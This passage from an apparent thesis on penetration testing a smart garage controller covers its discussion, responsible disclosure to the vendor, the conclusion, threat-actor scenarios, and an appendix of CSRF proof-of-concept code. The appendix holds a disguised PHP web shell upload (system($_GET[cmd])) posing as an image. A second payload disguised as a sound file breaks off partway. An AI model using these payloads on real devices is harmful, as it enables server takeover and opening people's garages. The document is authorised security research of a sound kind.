CHAPTER 7. DISCUSSION

attacker could gain root access to the web server of the controller by only hav-
ing the user interact with one click.

The result is reliable, the methods used and the theory the discussions were
based on are described for each exploitation task. In those cases where a vul-
nerability was found, it was validated by creating and testing a PoC. The PoCs
were designed to imitate an attack that an adversary would perform against the
system.

It is diﬃcult to decide which vulnerability is the most urgent to ﬁx. For exam-
ple the privilege escalation gives the most power to abuse to the adversary, but
without the CSRF/clickjacking and the unrestricted ﬁle upload vulnerabilities
there is no known way for a remote attacker to exploit the privilege escalation.
The CSRF/clickjacking could be used by themselves to create new users, but
the new user is a normal user without higher access. Then, depending on the
goal of the attack, whether it be to gain physical access or to gain access to
the web server, the CSRF/clickjacking alone could be seen as a high severity
vulnerability, due to the ability to open garage doors through a GET request.

What was found to be interesting was that the vulnerabilities did not only
compromise the cybersecurity, but also the physical security. Multiple secu-
rity vulnerabilities could be used to open the garage door, e.g. session hijack-
ing (section 5.2), CSRF (section 5.3), clickjacking (section 5.5), and privilege
escalation (section 5.17). Garages can be chained together with other neigh-
bours’ garages, thus if one of them has this smart garage installed it is enough
to break into all the neighbours’ garages in the same chain. Another type of
garage is the ones that are linked together with the actual house. There is a
chance that the door between the garage and the house is unlocked, due to the
safety the garage door is supposed to provide. If that type of garage has a com-
promised smart garage, the attacker would have access to the whole house and
not only the garage.

For the eleven vulnerabilities (see section 6.1) to be exploited by an unau-
thenticated remote attacker, there need to be user interaction in the form of
either clicking a link in an email or pressing a button on a decoy website. The
attacks tested in the PoCs are not independent of user interaction.

To answer the research question how secure is the smart garage?, the impact
and probability of a successful attack was considered (see section 6.2). The

CHAPTER 7. DISCUSSION

97

PoCs’ probability of success were rated excellent or good since they did not re-
quire any special equipment, extraordinary computational power to succeed or
special circumstances. Most of the attacks would require some kind of knowl-
edge about how to use a terminal (to enable netcat communication) or how
to set up a website (for POST requests in CSRF or clickjacking), but opening
the garage door only requires the attacker to send the legitimate link used to
open garage doors to the victim. Therefore, an attacker could have very little
resources and still be able to hack the garage.

7.3 Sustainability and Ethics

When searching for and ﬁnding vulnerabilities in products (software or hard-
ware) there are two common ways to bring awareness to the vulnerabilities.
One is full disclosure, where the security researcher publishes the vulnerabil-
ity without giving the company that produces the product time to patch it. It
can be seen to have beneﬁts for both the general public and for the adversaries.
For the general public, the customers quickly get noticed by the vulnerability
and can take their own actions. At the same time it informs the adversaries
about the vulnerability, and makes it easier for them to exploit it in the wild.
An argument against the last sentence is that it can be assumed that if a security
researcher ﬁnds a vulnerability, the adversary has already found it. Depend-
ing on the product, the adversary could have endless resources of knowledge,
time and money, and if the vulnerability has not yet been discovered, it is only
a question of time.

The second approach is called responsible disclosure. The security researcher
contacts the company developing the product, and they agree on a time frame
for when the vulnerability can be released to the public. The agreed time
could be weeks or years, depending on the ability to create a patch. After a
patch is released, the vulnerability would register for a CVE ID and be pub-
licly known. Responsible disclosure only works if the company is willing to
collaborate within a given time frame.

What happens if the company has not created a patch within the time frame?
The security researcher could either renegotiate and expand the time frame, or
decide to go public with the vulnerability.

During this work, the eleven found vulnerabilities described in chapter 6 have
been reported to the CEO of iSmartgate. Thus, following the approach of re-

98

CHAPTER 7. DISCUSSION

sponsible disclosure.

The ethical discussion of this work could also involve the law in Sweden, the
country from where the work was done. According to the Swedish law Brotts-
balken 4 kap. 9c § 1, it is illegal to hack someone else’s property. To follow
that law, no hacking was made to cloud storage or remote servers. Only the
bought product, with permission of the owner, was used for attempts of hack-
ing.

From a sustainable perspective, the work had no signiﬁcant impact on the eco-
logical or social sustainability. Except for the small consumption of electric
power used for running the lab and for writing this report. One could argue
that this work could improve the economic sustainability by contributing to
a more secure IoT product, that with a patch will be less likely to be used in
illegal operations. Example of illegal operations are the recruitment of IoT de-
vices to botnets used to DDoS business or governments around the world, or
acquirement of IoT devices to use the computational power for mining cryp-
tocurrencies that will fund illegal activities.

1https://lagen.nu/begrepp/Dataintrång | Published unknown, visited 2020-06-12, website

in Swedish

Chapter 8

Conclusion & Future Work

Conclusions drawn and interesting ideas for future work.

8.1 Conclusion

Securing an IoT system is not an easy task, but an important one in order to
provide security and privacy to the customers. A smart garage may seem harm-
less, with its goal to increase the surveillance of property along with remote
functionality, but it turns out that the new generation of garage openers pose a
bigger threat towards the owner’s security and privacy than its predecessor.

The answer to the research question is that the iSmartgate PRO version 1.5.9
had improvements that could be done to its security. A total of eleven vulner-
abilities were reported to the company and the majority of them would com-
promise the smart garage to the extent of opening the garage door remotely.
Not only was the cybersecurity impacted, but also the physical security of the
property protected by the smart garage. Three of the vulnerabilities (CSRF,
unrestricted ﬁle upload and privilege escalation) could be combined into a one-
click-root attack, where the attacker would gain root access to the web server
of the controller.

Thanks to the quick response from the manufacturer of iSmartgate PRO, new
patches have been rolled out along with the reporting of the discovered vul-
nerabilities. Improvements have been made, and it is good to see that there
are companies out there in the IoT industry willing to learn and enhance their
security.

99

100

CHAPTER 8. CONCLUSION & FUTURE WORK

8.2 Future Work

This smart garage consists of many components, both software and hardware,
unfortunately only the web application of the controller was part of the scope
for the penetration testing. This means that even though patches are being cre-
ated for the vulnerabilities reported in this report, there are components left to
investigate.

The web application of the camera could be interesting to examine, since
it proved to be running software with known vulnerabilities (Adobe Flash
Player). Potentially an attacker could gain access to the video and to the mi-
crophone. Another component to audit is the communication between the tilt
sensor and the controller. Spooﬁng the signal sent from the tilt sensor could
fool the controller to leave the garage door open. The ability 1 to communicate
over Bluetooth with the controller, the USB port placed on the controller or
the Ethernet port on the camera could be of interest.

Other tests that could be made are to include the integrations with the third
parties mentioned in the beginning of the report (section 1.5).

Even digging deeper and wider into the web application of the controller could
lead to more ﬁndings. The testing could move from a black box perspective to
a white box perspective after having access to the web server. Code auditing
could be made, especially useful for determining how input and output data
are being validated/encoded/escaped. The Nessus scan indicated that the SSH
port used OpenSSH v7.1, which is not up to date 2. It could be vulnerable to
information leak 3 and buﬀer overﬂow/denial of service 4.

1https://fccid.io/VPYLB1DX | Published unknown, visited 2020-03-01
2https://www.openssh.com/txt/release-7.1p2 | Published 2016-01-14, visited 2020-04-13
3https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0777 | Published 2015-12-

16, visited 2020-06-14

4https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0778 | Published 2015-12-

16, visited 2020-06-14

Bibliography

[1] Roberto Minerva, Abyi Biru, and Domenico Rotondi. “Towards a def-
inition of the Internet of Things (IoT)”. In: IEEE Internet Initiative 1.1
(2015), pp. 1–86.

[2] M Ersue et al. “Management of networks with constrained devices: use

cases”. In: IETF internet (2014).

[3] Constantinos Kolias et al. “DDoS in the IoT: Mirai and other botnets”.

In: Computer 50.7 (2017), pp. 80–84.

[4] Sam Quinn, Steve Povolny, and Kevin McGrath. FHSS Selective Jam-
ming and Capture of Chamberlain Smart Garage Hub “MyQ” State
Sensor (MYQ-G0301-E/MYQ-G0302). 2020. 16 pp.

[5] Georgia Weidman. Penetration testing: a hands-on introduction to hack-

ing. No Starch Press, 2014.

[6] Searchable FCC ID Database. Published unknown, visited 2020-03-01.

url: https://fccid.io/.

[7] Gordon Lyon. Intro. Published unknown, visited 2020-05-21. url: https:

//nmap.org/.

[8] Wenjun Xiong and Robert Lagerström. “Threat modeling – A system-
atic literature review”. In: Computers & Security 84 (2019), pp. 53–69.
issn: 0167-4048. doi: https://doi.org/10.1016/j.cose.
2019 . 03 . 010. url: http : / / www . sciencedirect . com /
science/article/pii/S0167404818307478.

[9] Anton V. Uzunov and Eduardo B. Fernandez. “An extensible pattern-
based library and taxonomy of security threats for distributed systems”.
In: Computer Standards & Interfaces 36.4 (2014). Security in Informa-
tion Systems: Advances and new Challenges., pp. 734–747. issn: 0920-
5489. doi: https://doi.org/10.1016/j.csi.2013.12.
008. url: http : / / www . sciencedirect . com / science /
article/pii/S0920548913001827.

101

102

BIBLIOGRAPHY

[10] Aaron Guzman and Aditya Gupta. IoT Penetration Testing Cookbook:
Identify vulnerabilities and secure your smart devices. Packt Publishing
Ltd, 2017.

[11] Adam Shostack. Threat modeling: Designing for security. John Wiley

& Sons, 2014.

[12] Bruce Schneier. “Attack trees”. In: Dr. Dobb’s journal 24.12 (1999),

pp. 21–29.

[13] Srinivas Nidhra and Jagruthi Dondeti. “Black box and white box testing
techniques-a literature review”. In: International Journal of Embedded
Systems and Applications (IJESA) 2.2 (2012), pp. 29–50.

[14] Nancy R Mead et al. “A hybrid threat modeling method”. In: Carnegie

MellonUniversity-Software Engineering Institute-Technical Report-CMU/SEI-
2018-TN-002 (2018).

[15] Allen D Householder et al. The cert guide to coordinated vulnerability
disclosure. Tech. rep. Carnegie-Mellon Univ Pittsburgh Pa Pittsburgh
United States, 2017.

[16] Ben Alex and Luke Taylor. Cross Site Request Forgery (CSRF). Pub-
lished unknown, visited 2020-04-30. url: https://docs.spring.
io/spring-security/site/docs/3.2.0.CI-SNAPSHOT/
reference/html/csrf.html.

[17] PortSwigger Ltd. Cross-site request forgery (CSRF). Published unknown,

visited 2020-05-21. url: https : / / portswigger . net / web -
security/csrf.

[18] Sean-Philip Oriyano and Robert Shimonski. Client-side attacks and de-

fense. Newnes, 2012.

[19] Thomas More Peake. “Eavesdropping in communication networks”. In:

Animal communication networks (2005), pp. 13–37.

[20] Franco Callegati, Walter Cerroni, and Marco Ramilli. “Man-in-the-Middle

Attack to the HTTPS Protocol”. In: IEEE Security & Privacy 7.1 (2009),
pp. 78–81.

Appendix A

Use Cases

Here are all use cases displayed from section 4.2.

Figure A.1: Use case 1 and 2 represented in a data ﬂow diagram

103

104

APPENDIX A. USE CASES

Figure A.2: Use case 3 and 4 represented in a data ﬂow diagram

APPENDIX A. USE CASES

105

Figure A.3: Use case 5 and 6 represented in a data ﬂow diagram

106

APPENDIX A. USE CASES

Figure A.4: Use case 7 represented in a data ﬂow diagram

APPENDIX A. USE CASES

107

Figure A.5: Use case 8 represented in a data ﬂow diagram

Figure A.6: Use case 9 represented in a data ﬂow diagram

108

APPENDIX A. USE CASES

Figure A.7: Use case 10 represented in a data ﬂow diagram

Figure A.8: Use case 11 and 12 represented in a data ﬂow diagram

APPENDIX A. USE CASES

109

Figure A.9: Use case 13 and 14 represented in a data ﬂow diagram

110

APPENDIX A. USE CASES

Figure A.10: Use case 15 and 16 represented in a data ﬂow diagram

Appendix B

Threat Actors

A total of 17 threat actors were identiﬁed by using the Cyber Bogies card deck.
They are listed in table B.1. More information can be found in section 4.4.1.

Threat Actors

Cyber Bogie
Script
"Jonne"

kiddie

Potential attack or misuse case
Jonne stumbles upon the camera at Shodan and decides to play a prank on the
owner. Jonne adds an audio clip that plays on the controller when the owner
enters the garage. Then Jonne records the reaction of the owner and publish it
online.
Charlotte likes to watch the video streams of customers at work. The funniest
videos are being shown to the team.

Cloud
"Charlotte"
Petty thief "Kyle" Kyle is a small-time criminal who discovered a blog post of how to disable the
security features of the smart garage. He seizes the opportunity to steal the
expensive equipment stored in the garage.
Sergei is always on the lookout for devices to add to his botnet. A smart garage
controller and camera are easy targets.

admin

cam-
runner

Malware
paign
"Sergei"
Competitor R&D
engineer "Jin"
State-sponsored
agent
Hound"

"Magic

Clueless
ployee "Josh"

em-

Jin has received the task to reverse engineer the smart garage from his em-
ployer. It will be used to create a competing product.
Magic Hound’s employer knows that a person of interest has a smart garage
installed. Magic Hound’s task is to collect intelligence about the daily life of
the person of interest. Lucky for Magic Hound that the system both have a
microphone and a camera!
Josh is lacking proper training, but is eager to ﬁnish his tasks. Sometimes he
is in charge of things he probably shouldn’t be. For example the time when he
accidentally distributed the private keys to all employees.

111

112

APPENDIX B. THREAT ACTORS

Cyber Bogie
Brutal
"Sini"

cleaner

engi-
victim

Social
neering
"Patsy"
Supply chain at-
tacker "Lisbeth"
Incompetent
developer "Derk"

Thoughtless
project manager
"Aisha"
Enthusiastic
hacktivist
"Anonymous
N.N"
Attention junkie
"Jules"

Stubborn stalker
"Sasha"

Evil data scientist
"Aidan"

Proﬁts ﬁrst mar-
keteer "Mo"

Continuation of Table B.1

Potential attack or misuse case
Sini is an elderly cleaner who cleans the house once a week. When Sini gets to
the garage there are some cables that are in the way for the vacuum cleaner, so
naturally she unplugs them. Ops, Sini accidentally created a successful denial
of service attack.
Patsy works at the vendor’s company and accidentally distributes its cloud keys
in a phishing campaign.

Lisbeth wants to provide a backdoor for her employer to spy on customers’
video streams.
Derk has no formal software engineering training. Sometimes common vul-
nerabilities, like OWASP top 10, get sneaked in by accident when Derk is
coding.
Aisha is under time pressure and thinks that the last security audit was enough.
Thus privacy experts are not invited since it slows down the development.

Anonymous N.N wants to gain control and turn the smart garage device into
a bot.

Jules just got her own smart garage and wants to show it oﬀ on social media
for her neighbours. When posting a screenshot of the features she accidentally
included the url to the device and the login username. Lets hope no one with
bad intentions sees this.
Sasha still has the login to her ex-spouse’s smart garage. She want to keep
track on the daily life going on in the house, for example who gets a ride in the
car to the house.
Aidan is great with ﬁnding patterns in data dumps. He works for the vendor
of the smart garage. Aidan looks at the customer data and pairs it to disclosed
data from pastebin to de-anonymize users.
Mo just like Aidan works at the company and does not care about ethics. Mo
looks at videos from customers to determine gender, age and other attributes
that can be used for marketing.

End of Table

Table B.1: Threat actors and their potential attack or misuse
case

Appendix C

PoC for CSRF & Unrestricted File
Uploading

PoC for two categories of vulnerabilities: CSRF and unrestricted ﬁle upload-
ing. They are demonstrated on the functionality of uploading an image and of
uploading a sound ﬁle.

C.1 PoC CSRF & Unrestricted File Upload-

ing: Image

The vulnerability CSRF is described in section 5.3, and the vulnerability un-
restricted ﬁle uploading is described in section 5.4.

1 < html >
2 <! -- CSRF PoC - g e n e r a t e d by Burp Suite P r o f e s s i o n a l -- >
3 < body >
4 < s c r i p t >
5

f u n c t i o n s u b m i t R e q u e s t ()
{

6

7

8

9

10

11

12

13

14

15

var xhr = new X M L H t t p R e q u e s t () ;
xhr . open ( " POST " , " http : \ / \ / 1 9 2 . 1 6 8 . 1 . 1 0 0 \ / index . php " ,

true ) ;

xhr . s e t R e q u e s t H e a d e r ( " Content - Type " , " m u l t i p a r t \/ form -

data ; b o u n d a r y = - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W " ) ;

xhr . s e t R e q u e s t H e a d e r ( " A c c e p t " , " text \/ html , a p p l i c a t i o n \/

xhtml + xml , a p p l i c a t i o n \/ xml ; q =0.9 , image \/ webp , image \/ apng
, * \ / * ; q =0.8 , a p p l i c a t i o n \/ signed - e x c h a n g e ; v = b3 ; q =0.9 " ) ;

xhr . s e t R e q u e s t H e a d e r ( " Accept - L a n g u a g e " , " en - US , en ; q =0.9 "

) ;

" +

xhr . w i t h C r e d e n t i a l s = true ;
var body = " - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n

" Content - D i s p o s i t i o n : form - data ; name =\ " M A X _ F I L E _ S I Z E \

" \ r \ n " +

" \ r \ n " +

113

APPENDIX C. POC FOR CSRF & UNRESTRICTED FILE

114
UPLOADING

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

45

46

47

48

49

50

51

52

53

54

55

56

57

58

59

60

61

62

63

64

+

+

" 2 0 0 0 0 0 0 0 \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e n a b l e 1 \ " \ r \ n "

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " mode1 \ " \ r \ n " +
" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d t i m e 1 \ " \ r \ n "

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " master - door1 \ "

\ r \ n " +

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m a g e s 1 \ " \ r \ n "

+

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m g o p e n 1 \ " ;

f i l e n a m e =\ " \ " \ r \ n " +

" Content - Type : a p p l i c a t i o n / octet - s t r e a m \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e x i f o p e n 1 \ " \ r \

n " +

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m g c l o s e 1 \ " ;

f i l e n a m e =\ " \ " \ r \ n " +

" Content - Type : a p p l i c a t i o n / octet - s t r e a m \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e x i f c l o s e 1 \ " \ r

\ n " +

+

+

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d n a m e 1 \ " \ r \ n "

" \ r \ n " +
" a l o h m o r a \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s e n s o r 1 \ " \ r \ n "

" \ r \ n " +
" 3\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " door1 \ " \ r \ n " +

APPENDIX C. POC FOR CSRF & UNRESTRICTED FILE UPLOADING
115

65

66

67

68

69

70

71

72

73

74

75

76

77

78

79

80

81

82

83

84

85

86

87

88

89

90

91

92

93

94

95

96

97

98

99

100

101

102

103

104

105

106

107

108

109

110

111

112

113

114

115

" \ r \ n " +
" 35 EB \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e n a b l e 2 \ " \ r \ n "

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " mode2 \ " \ r \ n " +
" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d t i m e 2 \ " \ r \ n "

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m a g e s 2 \ " \ r \ n "

+

+

+

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m g c l o s e 2 \ " ;

f i l e n a m e =\ " image . php \ " \ r \ n " +

" Content - Type : image / png \ r \ n " +
" \ r \ n " +
" \ x 8 9 P N G \ r \ n " +
" \ x1a \ n " +
" \ x00 \ x00 \ x00 \ r \ x3c ? php \ r \ n " +
" \ r \ n " +
" $cmd = $_GET [\ x 1 8 c m d \ x19 ];\ r \ n " +
" \ r \ n " +
" s y s t e m ( $cmd ) ;\ r \ n " +
" \ r \ n " +
" ?\ x3e \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e x i f c l o s e 2 \ " \ r

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d n a m e 2 \ " \ r \ n "

" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s e n s o r 2 \ " \ r \ n "

" \ r \ n " +
" 3\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " door2 \ " \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e n a b l e 3 \ " \ r \ n "

" \ r \ n " +
" 0\ r \ n " +

\ n " +

+

+

+

APPENDIX C. POC FOR CSRF & UNRESTRICTED FILE

116
UPLOADING

116

117

118

119

120

121

122

123

124

125

126

127

128

129

130

131

132

133

134

135

136

137

138

139

140

141

142

143

144

145

146

147

148

149

150

151

152

153

154

155

156

157

158

159

160

161

162

163

164

165

166

" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " mode3 \ " \ r \ n " +
" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d t i m e 3 \ " \ r \ n "

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m a g e s 3 \ " \ r \ n "

+

+

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m g o p e n 3 \ " ;

f i l e n a m e =\ " \ " \ r \ n " +

" Content - Type : a p p l i c a t i o n / octet - s t r e a m \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e x i f o p e n 3 \ " \ r \

n " +

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m g c l o s e 3 \ " ;

f i l e n a m e =\ " \ " \ r \ n " +

" Content - Type : a p p l i c a t i o n / octet - s t r e a m \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e x i f c l o s e 3 \ " \ r

\ n " +

+

+

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d n a m e 3 \ " \ r \ n "

" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s e n s o r 3 \ " \ r \ n "

" \ r \ n " +
" 3\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " door3 \ " \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " op \ " \ r \ n " +
" \ r \ n " +
" c o n f i g \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " opc \ " \ r \ n " +
" \ r \ n " +
" doors \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +

APPENDIX C. POC FOR CSRF & UNRESTRICTED FILE UPLOADING
117

167

168

169

170

171

172

173

174

175

176

177

178

179

180

181

182

183

184

185

186

187

" Content - D i s p o s i t i o n : form - data ; name =\ " upload - image \ "

\ r \ n " +

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " door - form \ " \ r \

n " +

" \ r \ n " +
" edit - door \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " config - gogo -

u p d a t e \ " \ r \ n " +
" \ r \ n " +
" U p d a t e \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 3 g 9 p C E V p 1 b R G g z Q W - -\ r \ n " ;

var aBody = new U i n t 8 A r r a y ( body . l e n g t h ) ;
for ( var i = 0; i < aBody . l e n g t h ; i ++)

aBody [ i ] = body . c h a r C o d e A t ( i ) ;

xhr . send ( new Blob ([ aBody ]) ) ;

}

</ s c r i p t >
< form a c t i o n = " # " >

< input type = " b u t t o n " value = " S u b m i t r e q u e s t " o n c l i c k = "

s u b m i t R e q u e s t () ; " / >
</ form >

</ body >

188
189 </ html >

Listing C.1: PoC for CSRF and unrestricted ﬁle uploading for the functionality
of uploading images

C.2 PoC CSRF & Unrestricted File Upload-

ing: Sound

The vulnerability CSRF is described in section 5.3, and the vulnerability un-
restricted ﬁle uploading is described in section 5.4.

1 < html >
2

<! -- CSRF PoC - g e n e r a t e d by Burp Suite P r o f e s s i o n a l -- >
< body >
< s c r i p t > h i s t o r y . p u s h S t a t e ( ' ' , ' ' , '/ ') </ s c r i p t >

< s c r i p t >

f u n c t i o n s u b m i t R e q u e s t ()
{

var xhr = new X M L H t t p R e q u e s t () ;
xhr . open ( " POST " , " http : \ / \ / 1 9 2 . 1 6 8 . 1 . 1 0 0 \ / index . php " ,

true ) ;

xhr . s e t R e q u e s t H e a d e r ( " A c c e p t " , " *\/* " ) ;
xhr . s e t R e q u e s t H e a d e r ( " Content - Type " , " m u l t i p a r t \/ form -

data ; b o u n d a r y = - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A " ) ;

xhr . s e t R e q u e s t H e a d e r ( " Accept - L a n g u a g e " , " en - US , en ; q =0.9 "

) ;

xhr . w i t h C r e d e n t i a l s = true ;

3

4

5

6

7

8

9

10

11

12

13

APPENDIX C. POC FOR CSRF & UNRESTRICTED FILE

118
UPLOADING

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

45

46

47

48

49

50

51

52

53

54

55

56

57

58

59

60

var body = " - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n

" +

" Content - D i s p o s i t i o n : form - data ; name =\ " M A X _ F I L E _ S I Z E \

" \ r \ n " +

" \ r \ n " +
" 1 0 0 0 0 0 0 0 0 \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " alarm \ " \ r \ n " +
" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " v o l u m e \ " \ r \ n "

+

r \ n " +

" \ r \ n " +
" 23\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " sound - type1 \ " \

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s o u n d o p e n 1 \ " ;

f i l e n a m e =\ " m y r e c o r d . php \ " \ r \ n " +

" Content - Type : audio / wav \ r \ n " +
" \ r \ n " +
" RIFF \ xd8 \ r \ n " +
" \ x 0 0 W A V E f m t \ x10 \ x00 \ x00 \ x00 \ x01 \ x00 \ x02 \ x00D \ xac \ x00

\ x00 \ x10 \ xb1 \ x02 \ x00 \ x04 \ x00 \ x10 \ x 0 0 d a t a L \ r \ n " +

